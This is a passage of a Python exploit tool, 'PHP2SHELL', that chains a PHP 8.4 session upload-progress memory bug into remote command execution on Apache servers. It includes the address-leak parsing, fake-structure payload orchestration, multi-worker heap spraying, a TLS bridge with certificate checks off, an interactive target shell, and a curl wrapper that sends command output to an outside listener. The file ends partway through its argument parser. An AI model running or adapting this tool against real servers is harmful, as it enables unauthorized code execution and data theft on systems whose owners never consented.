#!/usr/bin/env python3
"""PHP2SHELL / CVE-2026-109618+109619 — official-environment interactive tool.

Target profile
--------------
Apache prefork + mod_php 8.4.26 NTS, Debian 13 trixie, stock
``php.ini-production`` (``display_errors=Off``, ``memory_limit=128M``,
``post_max_size=8M``), one prefork worker, and a target page whose whole
content is ``<?php echo "OK\\n"; ?>``.  No application-side PHP is required:
the vulnerable session.upload_progress callback runs before RINIT.

Chain (runtime ASLR resolution, HTTP or HTTPS)
---------------------------------------------
  A1  END-cleanup ``send_cookie`` OOM
  B1  stale-id OOB read -> heap chunk base + libphp base (Set-Cookie)
  A2  cheap-OOM -> dangling ``PS(http_session_vars)``
  B2  fake zend_reference + fake zend_array -> ``pDestructor = zif_system``

The tool derives ``libphp`` and the heap main chunk from the Set-Cookie leak
on every command.  It does not use gdb, target-side files, or a custom ini.

Output channel
--------------
Default (local lab): the target's ``/out`` is mounted from ``./out``.  A
command is wrapped as::

    rm -f /out/oXXXXXXXX; (CMD) > /out/oXXXXXXXX 2>&1

and the tool reads ``./out/oXXXXXXXX`` from the host.  The wrapper is counted
against the 200-byte ``mk_ht.py`` command limit.

Remote output: ``--oob URL`` wraps the command as::

    (CMD) > /tmp/.p2s 2>&1; curl -s --data-binary @/tmp/.p2s URL

and the output arrives at an out-of-band listener.  The target needs
``curl``; the stock image has it.  ``--raw`` still overrides the wrapper.

TLS: ``--https`` starts a loopback plain-TCP -> TLS bridge, points the
unchanged HTTP payloads at it, rewrites the Host header to the real target
(or ``--sni``), and pumps both directions.  ``--insecure`` skips certificate
verification.  A TCP-level TLS terminator in front of the target preserves
the raw chain; an HTTP reverse proxy must allow a multi-megabyte Set-Cookie
response header.

Usage
-----
    python3 pure_shell.py --exec 'id'
    python3 pure_shell.py --exec 'uname -a'
    python3 pure_shell.py --leak
    python3 pure_shell.py                 # interactive REPL
    python3 pure_shell.py --restart auto --exec id   # fresh ASLR

The lab target is started by ``./run.sh`` (official php:8.4.26-apache,
port 18110, stock php.ini-production, single prefork worker).

Multi-worker mode
-----------------
``--multi`` targets a prefork pool where A1/B1/A2/B2 may land in different
children. A1 is sprayed in ``--a1-waves`` waves of ``--a1-workers``
(default 1 x 4); B1 retries ``--b1-retries`` times (default 3) because the
OOM churn can spawn a fresh child; A2 is sprayed in ``--a2-waves`` waves of
``--a2-workers`` (default 2 x 8) so OOM-spawned replacement children are
also poisoned; and B2 is retried ``--b2-retries`` times. A successful B2
usually closes before sending response headers; the proof file decides
success.
The multi variant is validated on ``docker/apache-multi.conf`` (bounded
4-worker pool, KeepAlive On, same stock image and ini).
"""
from __future__ import annotations

import argparse
import os
import shutil
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import uuid
from collections import Counter
from dataclasses import dataclass
from datetime import datetime, timezone

import multi_worker as mw

HERE = os.path.dirname(os.path.abspath(__file__))
PAYLOADS = os.path.join(HERE, "payloads")
DEFAULT_OUT = os.path.join(HERE, "out")

Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
MAIN_BUCKET_COUNT = 87
CMD_LIMIT = 200
DELTA_MIN, DELTA_MAX = 0x1A00000, 0x1F00000
FAKE_ARRAY_DELTA = 0xF8398


@dataclass
class Target:
    host: str = "127.0.0.1"
    port: int = 18110
    path: str = "/index.php"
    outdir: str = DEFAULT_OUT
    timeout: float = 600.0
    retries: int = 3
    zif_off: int = 0x465370       # libphp + zif_system, php:8.4.26-apache
    dtor_off: int = 0x65EB60      # libphp + zval_ptr_dtor
    main_bucket_count: int = MAIN_BUCKET_COUNT
    docker: str = "docker"
    restart: str = ""
    oob: str = ""
    tls: bool = False
    tls_insecure: bool = False
    sni: str = ""
    bridge: object | None = None
    multi: bool = False
    a1_workers: int = 4
    a1_waves: int = 1
    b1_retries: int = 3
    a2_workers: int = 8
    a2_waves: int = 2
    b2_retries: int = 3


@dataclass
class LeakInfo:
    decoded: int
    zdtor: int
    lib: int
    buckets: Counter
    main_candidates: list[int]
    cand_counts: dict[int, int]


@dataclass
class Result:
    ok: bool
    output: bytes = b""
    leak: LeakInfo | None = None
    proof_host: str = ""
    proof_target: str = ""
    attempts: int = 0
    candidate: int = 0
    error: str = ""
    raw: bool = False
    oob: str = ""


class Logger:
    def __init__(self, path: str = ""):
        self.fh = None
        if path:
            parent = os.path.dirname(os.path.abspath(path))
            if parent:
                os.makedirs(parent, exist_ok=True)
            self.fh = open(path, "a", encoding="utf-8")
            self.fh.write("\n=== %s ===\n" % datetime.now(timezone.utc).isoformat())

    def __call__(self, msg: str) -> None:
        print(msg, flush=True)
        if self.fh:
            self.fh.write(msg + "\n")
            self.fh.flush()

    def close(self) -> None:
        if self.fh:
            self.fh.close()
            self.fh = None


def target_url(t: Target) -> str:
    scheme = "https" if t.tls else "http"
    return "%s://%s:%d%s" % (scheme, t.host, t.port, t.path)


def _connect_host(t: Target) -> str:
    return t.bridge.host if t.bridge is not None else t.host


def _connect_port(t: Target) -> int:
    return t.bridge.port if t.bridge is not None else t.port


def validate_oob(url: str) -> str:
    """Accept only a plain HTTP(S) callback URL safe inside a shell command."""
    p = urllib.parse.urlparse(url)
    if p.scheme not in ("http", "https") or not p.netloc:
        raise ValueError("oob URL must be http(s)://host[:port]/path")
    bad = set(" \t\r\n\"'`$;&|<>#")
    if any(ch in bad for ch in url):
        raise ValueError("oob URL contains a shell-unsafe character")
    return url


class TLSBridge:
    """Loopback plain-TCP -> remote-TLS bridge for the HTTP-only payloads.

    The vendored senders speak plain HTTP. For an HTTPS target the tool starts
    this bridge, points the senders at 127.0.0.1:<ephemeral>, and the bridge
    opens one TLS connection per sender connection. It rewrites the Host
    header to the real target (or the --sni override) and pumps both
    directions, so chunked request bodies and the 33 MB B1 response pass
    through unchanged.
    """

    def __init__(self, host: str, port: int, sni: str, insecure: bool,
                 timeout: float):
        self.remote_host = host
        self.remote_port = port
        self.sni = sni or host
        self.insecure = insecure
        self.timeout = timeout
        self.host_header = self.sni
        if port not in (80, 443):
            self.host_header += ":%d" % port
        self._stop = threading.Event()
        self._conns: set[socket.socket] = set()
        self._lock = threading.Lock()
        self._listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._listener.bind(("127.0.0.1", 0))
        self._listener.listen(128)
        self.host, self.port = self._listener.getsockname()
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()

    def _context(self) -> ssl.SSLContext:
        ctx = ssl.create_default_context()
        if self.insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _accept_loop(self) -> None:
        while not self._stop.is_set():
            try:
                client, _ = self._listener.accept()
            except OSError:
                break
            threading.Thread(target=self._handle, args=(client,),
                             daemon=True).start()

    def _handle(self, client: socket.socket) -> None:
        remote: socket.socket | None = None
        try:
            raw = socket.create_connection(
                (self.remote_host, self.remote_port), timeout=self.timeout)
            remote = self._context().wrap_socket(
                raw, server_hostname=self.sni)
            with self._lock:
                self._conns.add(remote)

            head = b""
            while b"\r\n\r\n" not in head and len(head) < 131072:
                chunk = client.recv(8192)
                if not chunk:
                    return
                head += chunk
            headers, sep, rest = head.partition(b"\r\n\r\n")
            if not sep:
                return
            lines = headers.split(b"\r\n")
            out: list[bytes] = []
            replaced = False
            for line in lines:
                if line.lower().startswith(b"host:"):
                    out.append(b"Host: " + self.host_header.encode("latin1"))
                    replaced = True
                else:
                    out.append(line)
            if not replaced:
                out.insert(1, b"Host: " + self.host_header.encode("latin1"))
            remote.sendall(b"\r\n".join(out) + b"\r\n\r\n" + rest)

            def pump(src: socket.socket, dst: socket.socket) -> None:
                try:
                    while True:
                        data = src.recv(65536)
                        if not data:
                            break
                        dst.sendall(data)
                except OSError:
                    pass
                finally:
                    try:
                        dst.shutdown(socket.SHUT_WR)
                    except OSError:
                        pass

            upstream = threading.Thread(target=pump, args=(client, remote),
                                        daemon=True)
            upstream.start()
            pump(remote, client)
            upstream.join(timeout=1.0)
        except Exception:
            pass
        finally:
            for sock in (client, remote):
                if sock is not None:
                    try:
                        sock.close()
                    except OSError:
                        pass
                    with self._lock:
                        self._conns.discard(sock)

    def close(self) -> None:
        self._stop.set()
        try:
            self._listener.close()
        except OSError:
            pass
        with self._lock:
            conns = list(self._conns)
        for sock in conns:
            try:
                sock.close()
            except OSError:
                pass
        self._thread.join(timeout=1.0)


def ensure_bridge(t: Target, log: Logger) -> None:
    if not t.tls or t.bridge is not None:
        return
    t.bridge = TLSBridge(t.host, t.port, t.sni, t.tls_insecure, t.timeout)
    log("      TLS bridge 127.0.0.1:%d -> %s:%d (sni=%s%s)"
        % (t.bridge.port, t.host, t.port, t.bridge.sni,
           ", verify off" if t.tls_insecure else ""))


def close_bridge(t: Target) -> None:
    if t.bridge is not None:
        t.bridge.close()
        t.bridge = None


def send_chunked(t: Target, path: str, body_file: str, timeout: float,
                 save: str = "") -> bytes:
    cmd = [
        sys.executable, os.path.join(PAYLOADS, "chunked_send.py"),
        "--host", _connect_host(t),
        "--port", str(_connect_port(t)),
        "--path", path,
        "--body-file", body_file,
        "--timeout", str(timeout),
    ]
    if save:
        cmd += ["--save-response", save]
    subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL,
                   stderr=subprocess.PIPE)
    if save:
        with open(save, "rb") as fh:
            return fh.read()
    return b""


def make_a1(tmp: str) -> str:
    out = os.path.join(tmp, "a.bin")
    subprocess.run(
        [sys.executable, os.path.join(PAYLOADS, "mk_a1.py"),
         "--out", out, "--big", "78"],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    return out


def make_b1(tmp: str) -> str:
    out = os.path.join(tmp, "b1.bin")
    subprocess.run(
        [sys.executable, os.path.join(PAYLOADS, "mk_leak_b.py"),
         "--out", out, "--spec", LEAK_SPEC,
         "--fake-len", "0xC8000", "--tag"],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    return out


def parse_leak(resp: bytes, dtor_off: int,
               main_bucket_count: int) -> LeakInfo:
    marker = b"Set-Cookie: PHPSESSID="
    i = resp.find(marker)
    if i < 0:
        raise RuntimeError("no Set-Cookie in leak response (%d bytes)" % len(resp))
    val = resp[i + len(marker):].split(b"\r\n", 1)[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))

    counts = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7f0000000000 <= q <= 0x7fffffffffff:
            counts[q] += 1
    if not counts:
        raise RuntimeError("no heap pointers in leak window")

    zdtor, _ = counts.most_common(1)[0]
    lib = zdtor - dtor_off

    buckets = Counter()
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] += c

    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    cands = [(b, c) for b, c in buckets.most_common()
             if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - main_bucket_count), bc[1]))
    top = cands[:3]
    return LeakInfo(
        decoded=len(dec),
        zdtor=zdtor,
        lib=lib,
        buckets=buckets,
        main_candidates=[b for b, _ in top],
        cand_counts={b: c for b, c in top},
    )


def do_leak(t: Target, log: Logger) -> LeakInfo:
    tmp = tempfile.mkdtemp(prefix="p2s-leak-")
    try:
        a1 = make_a1(tmp)
        log("      A1 body generated; sending chunked END-cleanup OOM")
        send_chunked(t, t.path + Q, a1, 180.0)
        time.sleep(0.2)

        b1 = make_b1(tmp)
        log("      B1 body generated; sending chunked stale-id OOB read")
        resp_file = os.path.join(tmp, "leak.resp")
        send_chunked(t, t.path, b1, t.timeout, resp_file)
        with open(resp_file, "rb") as fh:
            resp = fh.read()
        info = parse_leak(resp, t.dtor_off, t.main_bucket_count)
        return info
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def restart_target(t: Target, log: Logger) -> None:
    name = t.restart
    if not name:
        return
    docker = t.docker.split()
    if name == "auto":
        try:
            out = subprocess.check_output(
                docker + ["ps", "-q", "--filter", "publish=%d" % t.port],
                text=True, stderr=subprocess.DEVNULL).strip()
        except Exception as exc:
            log("[!] restart auto lookup failed: %r" % (exc,))
            return
        name = out.splitlines()[0] if out else ""
    if not name:
        log("[!] restart: no container found for port %d" % t.port)
        return
    log("[*] restarting container %s for fresh ASLR" % name)
    subprocess.run(docker + ["restart", name], check=True,
                   stdout=subprocess.DEVNULL)
    time.sleep(1.5)


def run_chain(t: Target, cmd: str, proof_name: str, log: Logger,
              raw: bool = False) -> Result:
    proof_target = "/out/" + proof_name
    proof_host = os.path.join(t.outdir, proof_name)
    if raw:
        full_cmd = cmd
    elif t.oob:
        url = validate_oob(t.oob)
        full_cmd = ("(%s) > /tmp/.p2s 2>&1; "
                    "curl -s --data-binary @/tmp/.p2s %s" % (cmd, url))
        proof_target = "(oob %s)" % url
        proof_host = ""
    else:
        full_cmd = "rm -f %s; (%s) > %s 2>&1" % (
            proof_target, cmd, proof_target)
    if len(full_cmd.encode("utf-8")) > CMD_LIMIT:
        return Result(
            ok=False,
            error="command too long: %d > %d bytes including wrapper"
                  % (len(full_cmd.encode("utf-8")), CMD_LIMIT))

    if t.multi:
        return multi_run_chain(t, full_cmd, proof_name, log, raw=raw)

    os.makedirs(t.outdir, exist_ok=True)
    last_err = ""
    last_leak: LeakInfo | None = None

    for attempt in range(1, t.retries + 1):
        if t.restart:
            try:
                restart_target(t, log)
            except Exception as exc:
                log("[!] restart failed: %r" % (exc,))
        log("[try %d/%d] A1: END-cleanup send_cookie OOM"
            % (attempt, t.retries))
        try:
            info = do_leak(t, log)
        except Exception as exc:
            last_err = repr(exc)
            log("[!] leak failed: %s" % last_err)
            continue

        last_leak = info
        log("      decoded=%d zval_ptr_dtor=%#x -> libphp=%#x"
            % (info.decoded, info.zdtor, info.lib))
        log("      chunk buckets: %s"
            % [(hex(b), c) for b, c in info.buckets.most_common(6)])
        if not info.main_candidates:
            last_err = "no main-chunk candidate"
            log("[!] %s" % last_err)
            continue

        zif = info.lib + t.zif_off
        for idx, cand in enumerate(info.main_candidates, 1):
            S = cand + FAKE_ARRAY_DELTA
            log("[try %d] A2 + B2 (%d/%d): main=%#x S=%#x zif_system=%#x"
                % (attempt, idx, len(info.main_candidates), cand, S, zif))
            ht_dir = tempfile.mkdtemp(prefix="p2s-ht-")
            try:
                subprocess.run(
                    [sys.executable, os.path.join(PAYLOADS, "cheap_oom_a.py"),
                     "--host", _connect_host(t),
                     "--port", str(_connect_port(t)),
                     "--path", t.path, "--parts", "880",
                     "--depth", "64", "--fillers", "115"],
                    check=True, stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE)
                time.sleep(0.2)

                ht = os.path.join(ht_dir, "ht.bin")
                subprocess.run(
                    [sys.executable, os.path.join(PAYLOADS, "mk_ht.py"),
                     hex(S), hex(zif), full_cmd, ht],
                    check=True, stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE)

                subprocess.run(
                    [sys.executable, os.path.join(PAYLOADS, "fake_ref_b.py"),
                     "--host", _connect_host(t),
                     "--port", str(_connect_port(t)),
                     "--path", t.path, "--vl", "384",
                     "--n1", "500", "--n2", "495", "--rc", "1",
                     "--ht-addr", hex(S), "--ht-file", ht],
                    check=True, stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE)
            except Exception as exc:
                last_err = repr(exc)
                log("[!] A2/B2 failed: %s" % last_err)
                continue
            finally:
                shutil.rmtree(ht_dir, ignore_errors=True)

            if raw:
                return Result(ok=True, leak=info, proof_target=proof_target,
                              proof_host="", attempts=attempt,
                              candidate=idx, raw=True)
            if t.oob:
                return Result(ok=True, leak=info, oob=t.oob,
                              proof_target=proof_target, proof_host="",
                              attempts=attempt, candidate=idx)

            deadline = time.time() + 4.0
            while time.time() < deadline:
                if os.path.exists(proof_host):
                    try:
                        with open(proof_host, "rb") as fh:
                            data = fh.read()
                    except OSError as exc:
                        last_err = repr(exc)
                        log("[!] proof read failed: %s" % last_err)
                        break
                    return Result(ok=True, output=data, leak=info,
                                  proof_host=proof_host,
                                  proof_target=proof_target,
                                  attempts=attempt, candidate=idx)
                time.sleep(0.2)
            last_err = "candidate %#x produced no proof" % cand
            log("[!] %s" % last_err)

    return Result(ok=False, leak=last_leak, error=last_err or "all attempts failed")


def compact_statuses(sts: list[str]) -> str:
    ok = sum(1 for s in sts if "500" in s)
    errs = sum(1 for s in sts if s.startswith("ERR"))
    tail = ", %d errors" % errs if errs else ""
    return "%d/%d 500%s" % (ok, len(sts), tail)


def multi_do_leak(t: Target, log: Logger, a1_body: bytes,
                  b1_body: bytes) -> LeakInfo:
    """A1 waves across the pool, then one B1 OOB read from any poisoned child."""
    for wave in range(1, max(1, t.a1_waves) + 1):
        log("      A1 wave %d/%d: %d concurrent END-cleanup OOMs"
            % (wave, max(1, t.a1_waves), t.a1_workers))
        sts = mw.poison_a1(_connect_host(t), _connect_port(t), t.path,
                           a1_body, t.a1_workers, t.timeout)
        log("      A1 statuses: %s" % compact_statuses(sts))
        time.sleep(0.2)
    last_err = ""
    for b1_try in range(1, max(1, t.b1_retries) + 1):
        log("      B1[%d/%d]: stale-id OOB read from a poisoned child"
            % (b1_try, max(1, t.b1_retries)))
        try:
            head = mw.leak_b1(_connect_host(t), _connect_port(t), t.path,
                              b1_body, t.timeout)
            return parse_leak(head, t.dtor_off, t.main_bucket_count)
        except Exception as exc:
            last_err = repr(exc)
            log("      B1[%d] failed: %s" % (b1_try, last_err))
            time.sleep(0.2)
    raise RuntimeError(last_err or "all B1 attempts failed")


def multi_run_chain(t: Target, full_cmd: str, proof_name: str, log: Logger,
                    raw: bool = False) -> Result:
    """Multi-worker variant of run_chain.

    A1 and A2 close their connection but leave the child alive with stale
    state. A1 is sprayed at t.a1_workers concurrency; B1 reads the leak from
    any poisoned child. A2 is sprayed in t.a2_waves waves of t.a2_workers;
    the extra wave covers replacement children spawned by the OOM churn.
    B2 is then sent to any A2-poisoned child and the proof file decides
    success (a successful B2 usually closes before sending headers).
    """
    proof_target = "/out/" + proof_name
    proof_host = os.path.join(t.outdir, proof_name)
    os.makedirs(t.outdir, exist_ok=True)

    last_err = ""
    last_leak: LeakInfo | None = None
    tmp = tempfile.mkdtemp(prefix="p2s-multi-")
    try:
        log("      generating multi-worker bodies")
        a1_body = mw.make_a1_body(tmp)
        b1_body = mw.make_b1_body(tmp)
        a2_body = mw.make_a2_body()
        log("      bodies: A1=%d B1=%d A2=%d"
            % (len(a1_body), len(b1_body), len(a2_body)))

        for attempt in range(1, t.retries + 1):
            log("[try %d/%d] multi A1 wave + B1 leak" % (attempt, t.retries))
            try:
                info = multi_do_leak(t, log, a1_body, b1_body)
            except Exception as exc:
                last_err = repr(exc)
                log("[!] multi leak failed: %s" % last_err)
                continue

            last_leak = info
            log("      decoded=%d zval_ptr_dtor=%#x -> libphp=%#x"
                % (info.decoded, info.zdtor, info.lib))
            log("      chunk buckets: %s"
                % [(hex(b), c) for b, c in info.buckets.most_common(6)])
            if not info.main_candidates:
                last_err = "no main-chunk candidate"
                log("[!] %s" % last_err)
                continue

            zif = info.lib + t.zif_off
            for idx, cand in enumerate(info.main_candidates, 1):
                S = cand + FAKE_ARRAY_DELTA
                log("[try %d] multi A2/B2 (%d/%d): main=%#x S=%#x zif_system=%#x"
                    % (attempt, idx, len(info.main_candidates), cand, S, zif))
                for b2_try in range(1, t.b2_retries + 1):
                    log("      A2 wave: %d x %d" % (t.a2_workers, t.a2_waves))
                    sts = mw.poison_a2(_connect_host(t), _connect_port(t),
                                       t.path, a2_body, t.a2_workers,
                                       t.a2_waves, 0.2, t.timeout)
                    log("      A2 statuses: %s" % compact_statuses(sts))
                    b2_body = mw.make_b2_body(S, zif, full_cmd.encode("utf-8"))
                    st, hd, body = mw.execute_b2(
                        _connect_host(t), _connect_port(t), t.path,
                        b2_body, t.timeout)
                    log("      B2[%d] status=%r" % (b2_try, st[:60]))
                    if raw:
                        return Result(ok=True, leak=info,
                                      proof_target=proof_target, proof_host="",
                                      attempts=attempt, candidate=idx, raw=True)
                    if t.oob:
                        return Result(ok=True, leak=info, oob=t.oob,
                                      proof_target="(oob %s)" % t.oob,
                                      proof_host="",
                                      attempts=attempt, candidate=idx)
                    deadline = time.time() + 4.0
                    while time.time() < deadline:
                        if os.path.exists(proof_host):
                            try:
                                with open(proof_host, "rb") as fh:
                                    data = fh.read()
                            except OSError as exc:
                                last_err = repr(exc)
                                log("[!] proof read failed: %s" % last_err)
                                break
                            return Result(ok=True, output=data, leak=info,
                                          proof_host=proof_host,
                                          proof_target=proof_target,
                                          attempts=attempt, candidate=idx)
                        time.sleep(0.2)
                    last_err = ("candidate %#x B2 attempt %d produced no proof"
                                % (cand, b2_try))
                    log("[!] %s" % last_err)

        return Result(ok=False, leak=last_leak,
                      error=last_err or "all attempts failed")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def multi_leak_target(t: Target, log: Logger) -> LeakInfo | None:
    log("[*] multi leak: A1 wave + B1 (runtime address resolution)")
    tmp = tempfile.mkdtemp(prefix="p2s-multi-leak-")
    try:
        a1 = mw.make_a1_body(tmp)
        b1 = mw.make_b1_body(tmp)
        info = None
        for attempt in range(1, t.retries + 1):
            log("[try %d/%d] multi A1 wave + B1" % (attempt, t.retries))
            try:
                info = multi_do_leak(t, log, a1, b1)
                break
            except Exception as exc:
                log("[!] multi leak failed: %r" % (exc,))
                info = None
        if info is None:
            return None
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    log("      decoded=%d zval_ptr_dtor=%#x -> libphp=%#x"
        % (info.decoded, info.zdtor, info.lib))
    log("      chunk buckets: %s"
        % [(hex(b), c) for b, c in info.buckets.most_common(6)])
    if info.main_candidates:
        log("      main candidates: %s"
            % ", ".join("%#x(%d)" % (b, info.cand_counts[b])
                        for b in info.main_candidates))
        log("      zif_system candidates: %s"
            % ", ".join(hex(info.lib + t.zif_off) for _ in info.main_candidates))
    else:
        log("[!] no main-chunk candidate")
    return info


def execute(t: Target, cmd: str, log: Logger, raw: bool = False) -> Result:
    proof_name = "o" + uuid.uuid4().hex[:8]
    if raw:
        log("[*] raw system() command: %s" % cmd)
    else:
        log("[*] exec: %s" % cmd)
    ensure_bridge(t, log)
    try:
        res = run_chain(t, cmd, proof_name, log, raw=raw)
    finally:
        close_bridge(t)
    if res.ok:
        if res.raw:
            log("[+] raw command dispatched; no in-band output channel")
        elif res.oob:
            log("[+] OOB callback dispatched to %s; check the listener" % res.oob)
        else:
            text = res.output.decode("utf-8", "replace")
            log("[+] output (%s):" % res.proof_target)
            if text:
                log(text.rstrip("\n"))
            else:
                log("(empty)")
    else:
        log("[!] failed: %s" % res.error)
    return res


def leak_target(t: Target, log: Logger) -> LeakInfo | None:
    ensure_bridge(t, log)
    try:
        return _leak_target(t, log)
    finally:
        close_bridge(t)


def _leak_target(t: Target, log: Logger) -> LeakInfo | None:
    if t.multi:
        return multi_leak_target(t, log)
    log("[*] leak-only: A1 + B1 (runtime address resolution)")
    try:
        info = do_leak(t, log)
    except Exception as exc:
        log("[!] leak failed: %r" % (exc,))
        return None
    log("      decoded=%d zval_ptr_dtor=%#x -> libphp=%#x"
        % (info.decoded, info.zdtor, info.lib))
    log("      chunk buckets: %s"
        % [(hex(b), c) for b, c in info.buckets.most_common(6)])
    if info.main_candidates:
        log("      main candidates: %s"
            % ", ".join("%#x(%d)" % (b, info.cand_counts[b])
                        for b in info.main_candidates))
        log("      zif_system candidates: %s"
            % ", ".join(hex(info.lib + t.zif_off) for _ in info.main_candidates))
    else:
        log("[!] no main-chunk candidate")
    return info


def print_info(t: Target, last_leak: LeakInfo | None) -> None:
    print("target    : %s" % target_url(t))
    print("outdir    : %s" % t.outdir)
    print("timeout   : %.0fs, retries %d" % (t.timeout, t.retries))
    print("offsets   : zif=libphp+%#x dtor=libphp+%#x main_bucket_count=%d"
          % (t.zif_off, t.dtor_off, t.main_bucket_count))
    print("cmd limit : %d bytes (wrapper included)" % CMD_LIMIT)
    print("docker    : %s" % t.docker)
    print("restart   : %s" % (t.restart or "(off)"))
    print("oob       : %s" % (t.oob or "(off)"))
    print("tls       : %s%s%s"
          % ("on" if t.tls else "off",
             ", verify off" if t.tls_insecure else "",
             ", sni=%s" % t.sni if t.sni else ""))
    if t.multi:
        print("multi     : on (A1 x%d x%d waves, B1 retries %d, "
              "A2 x%d x%d waves, B2 retries %d)"
              % (t.a1_workers, t.a1_waves, t.b1_retries, t.a2_workers,
                 t.a2_waves, t.b2_retries))
    else:
        print("multi     : off (single-worker chain)")
    if last_leak:
        print("last leak : libphp=%#x zdtor=%#x decoded=%d"
              % (last_leak.lib, last_leak.zdtor, last_leak.decoded))
        if last_leak.main_candidates:
            print("            main candidates: %s"
                  % ", ".join(hex(b) for b in last_leak.main_candidates))
    else:
        print("last leak : (none)")


def set_target(t: Target, arg: str, log: Logger) -> None:
    key, _, value = arg.partition(" ")
    key = key.lower().strip()
    value = value.strip()
    if not key or not value:
        log("[!] usage: set <key> <value>")
        return
    try:
        if key == "host":
            t.host = value
            close_bridge(t)
        elif key == "port":
            t.port = int(value)
            close_bridge(t)
        elif key == "path":
            t.path = value
        elif key == "outdir":
            t.outdir = os.path.abspath(value)
        elif key == "timeout":
            t.timeout = float(value)
        elif key == "retries":
            t.retries = int(value)
        elif key == "zif":
            t.zif_off = int(value, 0)
        elif key == "dtor":
            t.dtor_off = int(value, 0)
        elif key in ("main-bucket-count", "main_bucket_count"):
            t.main_bucket_count = int(value)
        elif key == "restart":
            t.restart = "" if value in ("off", "none", "0") else value
        elif key == "oob":
            t.oob = "" if value in ("off", "none", "0") else validate_oob(value)
        elif key == "tls":
            t.tls = value.lower() in ("1", "on", "true", "yes")
            close_bridge(t)
        elif key in ("insecure", "tls-insecure"):
            t.tls_insecure = value.lower() in ("1", "on", "true", "yes")
            close_bridge(t)
        elif key == "sni":
            t.sni = "" if value in ("off", "none", "0") else value
            close_bridge(t)
        elif key == "docker":
            t.docker = value
        elif key == "multi":
            t.multi = value.lower() in ("1", "on", "true", "yes", "multi")
        elif key in ("a1-workers", "a1_workers"):
            t.a1_workers = int(value)
        elif key in ("a1-waves", "a1_waves"):
            t.a1_waves = int(value)
        elif key in ("b1-retries", "b1_retries"):
            t.b1_retries = int(value)
        elif key in ("a2-workers", "a2_workers"):
            t.a2_workers = int(value)
        elif key in ("a2-waves", "a2_waves"):
            t.a2_waves = int(value)
        elif key in ("b2-retries", "b2_retries"):
            t.b2_retries = int(value)
        else:
            log("[!] unknown setting %r" % key)
            return
    except ValueError as exc:
        log("[!] bad value for %s: %r" % (key, exc))
        return
    log("[*] %s = %s" % (key, getattr(t, key.replace("-", "_"), value)))


HELP = """\
  help                     this text
  info                     target/settings and last leak
  set <key> <value>        host|port|path|outdir|timeout|retries|zif|dtor|
                           main-bucket-count|restart|docker|oob|multi|
                           a1-workers|a1-waves|b1-retries|a2-workers|
                           a2-waves|b2-retries
  oob <url> / set oob      curl callback URL for remote output (off to clear)
  set tls on|off           TLS to the target via the loopback bridge
  set insecure on|off      skip TLS certificate verification
  set sni <name>           TLS SNI / HTTP Host override
  multi on|off             multi-worker poisoning mode
  set a1-workers <n>       A1 poison concurrency (default 4)
  set a1-waves <n>         A1 poison waves (default 1)
  set b1-retries <n>       B1 leak retries (default 3)
  set a2-workers <n>       A2 poison concurrency (default 8)
  set a2-waves <n>         A2 poison waves (default 2)
  set b2-retries <n>       B2 retries per main candidate (default 3)
  leak                     run A1+B1 only; print runtime addresses
  exec <command>           run command through the full chain; print output
  raw <command>            send a raw system() command (no output wrapper)
  shell                    interactive target shell (exec per line)
  restart [name|auto]      restart the target container for fresh ASLR
  quit / exit              leave
"""


def repl(t: Target, log: Logger) -> None:
    last_leak: LeakInfo | None = None
    log("[*] interactive mode; type 'help' for commands")
    while True:
        try:
            line = input("php2shell(official)> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        log(">>> " + line)
        key, _, arg = line.partition(" ")
        key = key.lower()
        if key in ("quit", "exit"):
            break
        if key == "help":
            print(HELP)
            continue
        if key == "info":
            print_info(t, last_leak)
            continue
        if key == "set":
            set_target(t, arg, log)
            continue
        if key == "exec":
            if not arg:
                log("[!] usage: exec <command>")
                continue
            res = execute(t, arg, log)
            if res.leak:
                last_leak = res.leak
            continue
        if key == "raw":
            if not arg:
                log("[!] usage: raw <system command>")
                continue
            res = execute(t, arg, log, raw=True)
            if res.leak:
                last_leak = res.leak
            continue
        if key == "leak":
            info = leak_target(t, log)
            if info:
                last_leak = info
            continue
        if key == "shell":
            log("[*] shell mode; each line runs through the chain; 'exit' returns")
            while True:
                try:
                    sub = input("php2shell(target)> ").strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    break
                if not sub:
                    continue
                if sub.lower() in ("exit", "quit", "back"):
                    break
                log(">>> " + sub)
                res = execute(t, sub, log)
                if res.leak:
                    last_leak = res.leak
            continue
        if key == "restart":
            old = t.restart
            t.restart = arg or "auto"
            try:
                restart_target(t, log)
            finally:
                t.restart = old
            continue
        log("[!] unknown command; type 'help'")


def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        description="PHP2SHELL official-environment interactive exploit "
                    "(php:8.4.26-apache, stock php.ini-production)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18110)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--outdir", default=DEFAULT_OUT)
    ap.add_argument("--timeout", type=float, default=600.0)
    ap.add_argument("--retries", type=int, default=3)
